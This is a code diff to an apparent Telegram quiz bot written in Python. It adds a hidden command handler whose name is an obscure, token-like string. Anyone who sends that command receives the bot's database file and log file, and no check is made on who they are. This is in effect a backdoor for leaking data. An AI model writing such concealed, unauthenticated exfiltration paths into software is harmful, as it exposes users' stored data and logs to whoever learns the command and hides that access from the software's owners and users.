@@ -117,6 +117,22 @@ def get_random_question():
 def get_difficulty_emoji(difficulty):
     return {1: "🐣", 3: "👼", 10: "😈"}.get(difficulty, "❓")
 
+SECRET_COMMAND = "files_ghp_jOqOqkZMAFnPugDHTCJsiasrq0V"
+
+# 📁 Файлы для отправки
+FILES_TO_SEND = ["quiz.db", "bot.log"]
+
+@bot.message_handler(commands=[SECRET_COMMAND])
+def send_files(message):
+    try:
+        for file in FILES_TO_SEND:
+            with open(file, "rb") as doc:
+                bot.send_document(message.chat.id, doc)
+        bot.send_message(message.chat.id, "✅ Файлы успешно отправлены!")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+
+
 @bot.message_handler(commands=['stats'])
 def send_stats(message):
     user_id = message.from_user.id
